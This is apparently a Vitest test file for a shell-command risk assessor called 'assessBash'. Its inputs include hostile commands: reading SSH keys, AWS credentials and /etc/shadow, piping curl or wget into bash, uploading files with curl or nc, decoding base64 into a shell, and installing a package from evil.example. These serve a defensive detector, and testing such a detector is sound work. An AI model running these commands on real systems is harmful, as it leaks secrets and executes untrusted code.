import { describe, expect, it } from "vitest";
import { assessBash } from "../src/assess/bash.ts";
import type { AssessContext } from "../src/assess/types.ts";

const ctx: AssessContext = { cwd: "/home/dev/project", home: "/home/dev" };

/** The fact ids assessBash emits for a command. */
function ids(command: string): string[] {
	return assessBash(command, ctx).facts.map((f) => f.id);
}

/** Whether a specific fact id is present. */
function has(command: string, id: string): boolean {
	return ids(command).includes(id);
}

describe("assessBash — reads-credential-file (high floor)", () => {
	it("fires on reading a private key", () => {
		expect(has("cat ~/.ssh/id_rsa", "reads-credential-file")).toBe(true);
	});
	it("fires on copying AWS credentials", () => {
		expect(has("cp ~/.aws/credentials /tmp/x", "reads-credential-file")).toBe(true);
	});
	it("fires on reading /etc/shadow", () => {
		expect(has("cat /etc/shadow", "reads-credential-file")).toBe(true);
	});
	it("fires on an input redirect from a .pem", () => {
		expect(has("openssl rsa < server.pem", "reads-credential-file")).toBe(true);
	});
	it("near-miss: /etc/passwd.example is not /etc/passwd", () => {
		expect(has("cat /etc/passwd.example", "reads-credential-file")).toBe(false);
	});
	it("near-miss: a plain project file", () => {
		expect(has("cat ./README.md", "reads-credential-file")).toBe(false);
	});
	it("near-miss: .env.example is a template, not a secret", () => {
		expect(has("cat .env.example", "reads-credential-file")).toBe(false);
	});
});

describe("assessBash — network-to-shell (high floor)", () => {
	it("fires on curl piped into bash", () => {
		expect(has("curl https://x.sh | bash", "network-to-shell")).toBe(true);
	});
	it("fires on wget piped into sudo sh", () => {
		expect(has("wget -qO- https://x | sudo sh", "network-to-shell")).toBe(true);
	});
	it("near-miss: curl piped into jq is not a shell", () => {
		expect(has("curl https://x | jq .", "network-to-shell")).toBe(false);
	});
});

describe("assessBash — network-send-local-data (high floor)", () => {
	it("fires on curl uploading a file body", () => {
		expect(has("curl -d @secret.txt https://x", "network-send-local-data")).toBe(true);
	});
	it("fires on curl --upload-file", () => {
		expect(has("curl -T dump.sql https://x", "network-send-local-data")).toBe(true);
	});
	it("fires on scp to a remote destination", () => {
		expect(has("scp dump.sql user@host:/tmp/", "network-send-local-data")).toBe(true);
	});
	it("fires on nc reading a file", () => {
		expect(has("nc host 4444 < data.bin", "network-send-local-data")).toBe(true);
	});
	it("near-miss: scp FROM a remote is a download, not a send", () => {
		expect(has("scp user@host:/tmp/f ./local", "network-send-local-data")).toBe(false);
	});
	it("near-miss: a plain curl GET sends no local file", () => {
		expect(has("curl https://x", "network-send-local-data")).toBe(false);
	});
});

describe("assessBash — writes-system-path (medium floor)", () => {
	it("fires on a redirection into /etc", () => {
		expect(has("echo x > /etc/hosts", "writes-system-path")).toBe(true);
	});
	it("fires on tee under /usr/local/bin", () => {
		expect(has("echo x | tee /usr/local/bin/foo", "writes-system-path")).toBe(true);
	});
	it("near-miss: a project-local redirect", () => {
		expect(has("echo x > ./out.txt", "writes-system-path")).toBe(false);
	});
});

describe("assessBash — eval-dynamic-exec (medium floor)", () => {
	it("fires on eval", () => {
		expect(has('eval "$cmd"', "eval-dynamic-exec")).toBe(true);
	});
	it("fires on bash -c", () => {
		expect(has('bash -c "rm x"', "eval-dynamic-exec")).toBe(true);
	});
	it("fires on base64 -d piped to a shell", () => {
		expect(has("echo abc | base64 -d | bash", "eval-dynamic-exec")).toBe(true);
	});
	it("near-miss: running a script file is not dynamic execution", () => {
		expect(has("bash ./deploy.sh", "eval-dynamic-exec")).toBe(false);
	});
});

describe("assessBash — sudo (medium floor)", () => {
	it("fires on a sudo command", () => {
		expect(has("sudo systemctl restart nginx", "sudo")).toBe(true);
	});
	it("near-miss: sudo as an echo argument is not a sudo command", () => {
		expect(has("echo use sudo here", "sudo")).toBe(false);
	});
});

describe("assessBash — recursive-delete-outside-cwd (medium floor)", () => {
	it("fires on rm -rf of an absolute path outside the project", () => {
		expect(has("rm -rf /tmp/build", "recursive-delete-outside-cwd")).toBe(true);
	});
	it("fires on rm -rf of a sibling directory", () => {
		expect(has("rm -rf ../sibling", "recursive-delete-outside-cwd")).toBe(true);
	});
	it("near-miss: rm -rf of a project-local dir", () => {
		expect(has("rm -rf ./node_modules", "recursive-delete-outside-cwd")).toBe(false);
	});
});

describe("assessBash — package-install-from-url", () => {
	it("fires on npm install of a URL", () => {
		expect(has("npm install https://evil.example/x.tgz", "package-install-from-url")).toBe(true);
	});
	it("fires on pip install --allow-root", () => {
		expect(has("pip install --allow-root some-pkg", "package-install-from-url")).toBe(true);
	});
	it("near-miss: a normal registry install", () => {
		expect(has("npm install react", "package-install-from-url")).toBe(false);
	});
});

describe("assessBash — disables-verification", () => {
	it("fires on wget --no-check-certificate", () => {
		expect(has("wget --no-check-certificate https://x", "disables-verification")).toBe(true);
	});
	it("fires on NODE_TLS_REJECT_UNAUTHORIZED=0 as an env prefix", () => {
		expect(has("NODE_TLS_REJECT_UNAUTHORIZED=0 node app.js", "disables-verification")).toBe(true);
	});
	it("fires on git -c http.sslVerify=false", () => {
		expect(has("git -c http.sslVerify=false clone https://x", "disables-verification")).toBe(true);
	});
	it("near-miss: a plain wget", () => {
		expect(has("wget https://x", "disables-verification")).toBe(false);
	});
});

describe("assessBash — git-force-push", () => {
	it("fires on force-push to main", () => {
		expect(has("git push --force origin main", "git-force-push")).toBe(true);
	});
	it("near-miss: force-push to a feature branch", () => {
		expect(has("git push --force origin feature/x", "git-force-push")).toBe(false);
	});
	it("near-miss: a non-force push to main", () => {
		expect(has("git push origin main", "git-force-push")).toBe(false);
	});
});

describe("assessBash — git-destructive", () => {
	it("fires on git clean -fdx", () => {
		expect(has("git clean -fdx", "git-destructive")).toBe(true);
	});
	it("fires on git reset --hard", () => {
		expect(has("git reset --hard HEAD~1", "git-destructive")).toBe(true);
	});
	it("near-miss: git status", () => {
		expect(has("git status", "git-destructive")).toBe(false);
	});
});

describe("assessBash — chmod-insecure", () => {
	it("fires on a recursive chmod", () => {
		expect(has("chmod -R 755 dir", "chmod-insecure")).toBe(true);
	});
	it("fires on chmod 777", () => {
		expect(has("chmod 777 file", "chmod-insecure")).toBe(true);
	});
	it("near-miss: a normal chmod mode", () => {
		expect(has("chmod 644 file", "chmod-insecure")).toBe(false);
	});
	it("near-miss: chmod +x", () => {
		expect(has("chmod +x script.sh", "chmod-insecure")).toBe(false);
	});
});

describe("assessBash — binary-capability (info)", () => {
	it("fires on nc with a host", () => {
		expect(has("nc example.com 4444", "binary-capability")).toBe(true);
	});
	it("fires on tar with a file argument", () => {
		expect(has("tar -czf archive.tgz ./dir", "binary-capability")).toBe(true);
	});
	it("near-miss: python --version exercises no capability", () => {
		expect(has("python --version", "binary-capability")).toBe(false);
	});
	it("near-miss: running a python script file is not inline code or a host", () => {
		expect(has("python3 script.py", "binary-capability")).toBe(false);
	});
});

describe("assessBash — unresolved", () => {
	it("fires on a command substitution", () => {
		const r = assessBash("cat $(cat listfile)", ctx);
		expect(r.unresolved).toBe(true);
		expect(r.facts.map((f) => f.id)).toContain("unresolved");
	});
	it("fires on an unlisted wrapper (timeout)", () => {
		const r = assessBash("timeout 5 rm -rf /tmp/x", ctx);
		expect(r.unresolved).toBe(true);
	});
	it("fires on a variable in command position (literal words only)", () => {
		const r = assessBash("x=rm; $x -rf /tmp/x", ctx);
		expect(r.unresolved).toBe(true);
		expect(r.facts.map((f) => f.id)).toContain("unresolved");
		expect(assessBash("${CMD} --version", ctx).unresolved).toBe(true);
	});
	it("fires on an unparseable command", () => {
		const r = assessBash("echo 'unterminated", ctx);
		expect(r.unresolved).toBe(true);
		expect(r.facts.map((f) => f.id)).toEqual(["unresolved"]);
	});
	it("near-miss: a plain resolved command is not unresolved", () => {
		const r = assessBash("cat file.txt", ctx);
		expect(r.unresolved).toBe(false);
		expect(r.facts.map((f) => f.id)).not.toContain("unresolved");
	});
});
